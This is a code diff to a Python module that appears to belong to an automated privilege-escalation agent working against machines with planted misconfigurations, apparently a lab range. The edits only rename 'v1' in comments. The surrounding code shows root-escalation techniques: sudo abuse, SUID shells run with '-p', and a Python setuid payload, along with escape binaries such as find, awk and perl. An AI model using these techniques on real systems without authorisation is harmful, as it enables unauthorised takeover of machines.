@@ -3,8 +3,8 @@
 The label is the routing vocabulary the rest of the agent shares
 (`base.can_root` / `base.root_cmd`, `intel.escalation_label`, `policy`): it is
 WHERE the box records *how* root is reachable, so every later root command rides
-the path that was proven here instead of assuming one. The vocabulary is v1's,
-unchanged:
+the path that was proven here instead of assuming one. The vocabulary is the
+earlier agent's, unchanged:
 
   ``sudo``          passwordless sudo
   ``sudo_pw``       sudo with the foothold's own password
@@ -12,21 +12,22 @@ unchanged:
   ``capexec:*``     a cap_setuid (or SUID) binary invoked as a command prefix
   ``system``        Windows: an Administrator session that reaches SYSTEM
 
-Two rules shape the port, both of them lessons from v1:
+Two rules shape the port, both of them lessons from the earlier agent:
 
 1. **A label is only ever emitted after the shared wrapper has proved it.** Every
    candidate mechanism is turned into the label it would record, then run through
    `root_cmd("id", <the foothold wearing that label>)` — the exact command every
    later root path will produce (`root_cmd` appends a command to the label's
    prefix). The result is `ok=True` only if that proving command returned
-   ``uid=0``/``euid=0``. A label that cannot be re-run is not a routing label: v1
-   recorded ``escape:python3`` / ``capexec:<path>`` for one-shot wrappers that
-   embed the command inside their own argument, so every later ``root_cmd`` on
-   those boxes produced a broken command line and the failure surfaced far away
-   from the escalation. Here those binaries are *proved* (the v1 one-shot wrapper
-   is still run, so a box that is rooted only that way is reported as such) and
-   then deliberately NOT labelled: the reason goes in the notes and the detail
-   says root is reachable but not routable, which is the honest state.
+   ``uid=0``/``euid=0``. A label that cannot be re-run is not a routing label: the
+   earlier agent recorded ``escape:python3`` / ``capexec:<path>`` for one-shot
+   wrappers that embed the command inside their own argument, so every later
+   ``root_cmd`` on those boxes produced a broken command line and the failure
+   surfaced far away from the escalation. Here those binaries are *proved* (the
+   earlier agent's one-shot wrapper is still run, so a box that is rooted only
+   that way is reported as such) and then deliberately NOT labelled: the reason
+   goes in the notes and the detail says root is reachable but not routable,
+   which is the honest state.
 2. **Discovery order comes from intel, never from an assumption.** nakon knows
    which misconfig families it planted (`intel.hints_for(ip)["escalation"]`,
    e.g. ``capexec:pending-discovery``), so the hinted family is probed first;
@@ -57,8 +58,9 @@ from .base import Effect, Result, can_root, register, root_cmd
 
 # --- the discovery ladder ------------------------------------------------------
 
-# Mechanism families, weakest-assumption first. v1's order: the clean win
-# (passwordless sudo) first, then password sudo, then the planted binaries.
+# Mechanism families, weakest-assumption first. The earlier agent's order: the
+# clean win (passwordless sudo) first, then password sudo, then the planted
+# binaries.
 FAMILIES = ("sudo", "sudo_pw", "suid", "capexec")
 
 # intel's hinted family is promoted to the front; the rest keep their order, so
@@ -89,8 +91,9 @@ SHELL_SUFFIX = {"bash": "-p -c", "sh": "-p -c", "dash": "-p -c", "ksh": "-p -c",
                 "zsh": "-p -c", "env": "/bin/sh -p -c"}
 SHELL_ORDER = ("bash", "sh", "dash", "ksh", "zsh", "env")
 
-# Binaries whose escape needs the command EMBEDDED in their own argument (v1's
-# ESCAPES, minus the shells): usable one-shot, never as a routing label.
+# Binaries whose escape needs the command EMBEDDED in their own argument (the
+# earlier agent's ESCAPES, minus the shells): usable one-shot, never as a
+# routing label.
 ONE_SHOT = ("find", "python3", "python2", "python", "awk", "gawk", "mawk", "nawk",
             "perl")
 
@@ -122,7 +125,8 @@ def labelled(fh, label):
 
 
 def one_shot_cmd(path, inner):
-    """v1's ESCAPES, keyed by the discovered path (command embedded, one-shot)."""
+    """The earlier agent's ESCAPES, keyed by the discovered path (command
+    embedded, one-shot)."""
     name = basename(path)
     if name.startswith("python"):
         payload = f"import os; os.setuid(0); os.system({json.dumps(inner)})"
@@ -336,8 +340,8 @@ class Escalate(Effect):
             return None, None, "suid: no set-uid binary found"
         notes.append(f"set-uid binaries on {ip}: {short(', '.join(paths), 300)}")
 
-        # A shell clone is a command prefix (routable); v1 tried find/python/awk
-        # first and recorded a label the router cannot re-run.
+        # A shell clone is a command prefix (routable); the earlier agent tried
+        # find/python/awk first and recorded a label the router cannot re-run.
         shells = sorted((p for p in paths if basename(p) in SHELL_SUFFIX),
                         key=lambda p: (SHELL_ORDER.index(basename(p)), p))
         for path in shells:
@@ -365,7 +369,7 @@ class Escalate(Effect):
 
     def _one_shot_root(self, ctx, ip, fh, paths, notes):
         """Prove (never label) the escapes that embed the command in their own
-        argument: v1's find/python3/awk wrappers."""
+        argument: the earlier agent's find/python3/awk wrappers."""
         for path in sorted(p for p in paths if basename(p) in ONE_SHOT):
             cmd = one_shot_cmd(path, PROOF_CMD)
             if cmd is None:
